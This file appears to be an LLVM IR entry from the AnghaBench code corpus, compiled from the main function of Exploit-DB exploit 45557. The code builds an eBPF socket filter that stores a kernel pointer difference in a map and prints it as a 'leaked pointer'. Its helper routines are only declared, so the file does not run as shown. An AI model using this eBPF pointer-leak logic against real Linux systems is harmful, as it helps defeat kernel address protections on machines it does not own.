; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_45557.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_45557.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.bpf_insn = type { i32 }

@BPF_REG_ARG1 = common dso_local global i32 0, align 4
@BPF_REG_ARG2 = common dso_local global i32 0, align 4
@BPF_REG_FP = common dso_local global i32 0, align 4
@BPF_ADD = common dso_local global i32 0, align 4
@BPF_W = common dso_local global i32 0, align 4
@BPF_FUNC_map_lookup_elem = common dso_local global i32 0, align 4
@BPF_REG_9 = common dso_local global i32 0, align 4
@BPF_SUB = common dso_local global i32 0, align 4
@BPF_REG_0 = common dso_local global i32 0, align 4
@BPF_JNE = common dso_local global i32 0, align 4
@BPF_DW = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"leaked pointer: 0x%lx\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [17 x %struct.bpf_insn], align 16
  %3 = alloca i32, align 4
  %4 = call i32 @array_create(i32 8, i32 1)
  store i32 %4, i32* %1, align 4
  %5 = getelementptr inbounds [17 x %struct.bpf_insn], [17 x %struct.bpf_insn]* %2, i64 0, i64 0
  %6 = load i32, i32* @BPF_REG_ARG1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = call i32 @BPF_LD_MAP_FD(i32 %6, i32 %7)
  %9 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %5, i32 0, i32 0
  store i32 %8, i32* %9, align 4
  %10 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %5, i64 1
  %11 = load i32, i32* @BPF_REG_ARG2, align 4
  %12 = load i32, i32* @BPF_REG_FP, align 4
  %13 = call i32 @BPF_MOV64_REG(i32 %11, i32 %12)
  %14 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %10, i32 0, i32 0
  store i32 %13, i32* %14, align 4
  %15 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %10, i64 1
  %16 = load i32, i32* @BPF_ADD, align 4
  %17 = load i32, i32* @BPF_REG_ARG2, align 4
  %18 = call i32 @BPF_ALU64_IMM(i32 %16, i32 %17, i32 -4)
  %19 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %15, i32 0, i32 0
  store i32 %18, i32* %19, align 4
  %20 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %15, i64 1
  %21 = load i32, i32* @BPF_W, align 4
  %22 = load i32, i32* @BPF_REG_ARG2, align 4
  %23 = call i32 @BPF_ST_MEM(i32 %21, i32 %22, i32 0, i32 9)
  %24 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %20, i32 0, i32 0
  store i32 %23, i32* %24, align 4
  %25 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %20, i64 1
  %26 = load i32, i32* @BPF_FUNC_map_lookup_elem, align 4
  %27 = call i32 @BPF_EMIT_CALL(i32 %26)
  %28 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %25, i32 0, i32 0
  store i32 %27, i32* %28, align 4
  %29 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %25, i64 1
  %30 = load i32, i32* @BPF_REG_9, align 4
  %31 = load i32, i32* @BPF_REG_FP, align 4
  %32 = call i32 @BPF_MOV64_REG(i32 %30, i32 %31)
  %33 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %29, i32 0, i32 0
  store i32 %32, i32* %33, align 4
  %34 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %29, i64 1
  %35 = load i32, i32* @BPF_SUB, align 4
  %36 = load i32, i32* @BPF_REG_9, align 4
  %37 = load i32, i32* @BPF_REG_0, align 4
  %38 = call i32 @BPF_ALU64_REG(i32 %35, i32 %36, i32 %37)
  %39 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %34, i32 0, i32 0
  store i32 %38, i32* %39, align 4
  %40 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %34, i64 1
  %41 = load i32, i32* @BPF_REG_ARG1, align 4
  %42 = load i32, i32* %1, align 4
  %43 = call i32 @BPF_LD_MAP_FD(i32 %41, i32 %42)
  %44 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %40, i32 0, i32 0
  store i32 %43, i32* %44, align 4
  %45 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %40, i64 1
  %46 = load i32, i32* @BPF_REG_ARG2, align 4
  %47 = load i32, i32* @BPF_REG_FP, align 4
  %48 = call i32 @BPF_MOV64_REG(i32 %46, i32 %47)
  %49 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %45, i32 0, i32 0
  store i32 %48, i32* %49, align 4
  %50 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %45, i64 1
  %51 = load i32, i32* @BPF_ADD, align 4
  %52 = load i32, i32* @BPF_REG_ARG2, align 4
  %53 = call i32 @BPF_ALU64_IMM(i32 %51, i32 %52, i32 -4)
  %54 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %50, i32 0, i32 0
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %50, i64 1
  %56 = load i32, i32* @BPF_W, align 4
  %57 = load i32, i32* @BPF_REG_ARG2, align 4
  %58 = call i32 @BPF_ST_MEM(i32 %56, i32 %57, i32 0, i32 0)
  %59 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %55, i32 0, i32 0
  store i32 %58, i32* %59, align 4
  %60 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %55, i64 1
  %61 = load i32, i32* @BPF_FUNC_map_lookup_elem, align 4
  %62 = call i32 @BPF_EMIT_CALL(i32 %61)
  %63 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %60, i32 0, i32 0
  store i32 %62, i32* %63, align 4
  %64 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %60, i64 1
  %65 = load i32, i32* @BPF_JNE, align 4
  %66 = load i32, i32* @BPF_REG_0, align 4
  %67 = call i32 @BPF_JMP_IMM(i32 %65, i32 %66, i32 0, i32 1)
  %68 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %64, i32 0, i32 0
  store i32 %67, i32* %68, align 4
  %69 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %64, i64 1
  %70 = call i32 (...) @BPF_EXIT_INSN()
  %71 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %69, i32 0, i32 0
  store i32 %70, i32* %71, align 4
  %72 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %69, i64 1
  %73 = load i32, i32* @BPF_DW, align 4
  %74 = load i32, i32* @BPF_REG_0, align 4
  %75 = load i32, i32* @BPF_REG_9, align 4
  %76 = call i32 @BPF_STX_MEM(i32 %73, i32 %74, i32 %75, i32 0)
  %77 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %72, i32 0, i32 0
  store i32 %76, i32* %77, align 4
  %78 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %72, i64 1
  %79 = load i32, i32* @BPF_REG_0, align 4
  %80 = call i32 @BPF_MOV64_IMM(i32 %79, i32 0)
  %81 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %78, i32 0, i32 0
  store i32 %80, i32* %81, align 4
  %82 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %78, i64 1
  %83 = call i32 (...) @BPF_EXIT_INSN()
  %84 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %82, i32 0, i32 0
  store i32 %83, i32* %84, align 4
  %85 = getelementptr inbounds [17 x %struct.bpf_insn], [17 x %struct.bpf_insn]* %2, i64 0, i64 0
  %86 = getelementptr inbounds [17 x %struct.bpf_insn], [17 x %struct.bpf_insn]* %2, i64 0, i64 0
  %87 = call i32 @ARRSIZE(%struct.bpf_insn* %86)
  %88 = call i32 @create_filtered_socket_fd(%struct.bpf_insn* %85, i32 %87)
  store i32 %88, i32* %3, align 4
  %89 = load i32, i32* %3, align 4
  %90 = call i32 @trigger_proc(i32 %89)
  %91 = load i32, i32* %1, align 4
  %92 = call i32 @array_get_dw(i32 %91, i32 0)
  %93 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i32 %92)
  ret i32 0
}

declare dso_local i32 @array_create(i32, i32) #1

declare dso_local i32 @BPF_LD_MAP_FD(i32, i32) #1

declare dso_local i32 @BPF_MOV64_REG(i32, i32) #1

declare dso_local i32 @BPF_ALU64_IMM(i32, i32, i32) #1

declare dso_local i32 @BPF_ST_MEM(i32, i32, i32, i32) #1

declare dso_local i32 @BPF_EMIT_CALL(i32) #1

declare dso_local i32 @BPF_ALU64_REG(i32, i32, i32) #1

declare dso_local i32 @BPF_JMP_IMM(i32, i32, i32, i32) #1

declare dso_local i32 @BPF_EXIT_INSN(...) #1

declare dso_local i32 @BPF_STX_MEM(i32, i32, i32, i32) #1

declare dso_local i32 @BPF_MOV64_IMM(i32, i32) #1

declare dso_local i32 @create_filtered_socket_fd(%struct.bpf_insn*, i32) #1

declare dso_local i32 @ARRSIZE(%struct.bpf_insn*) #1

declare dso_local i32 @trigger_proc(i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @array_get_dw(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
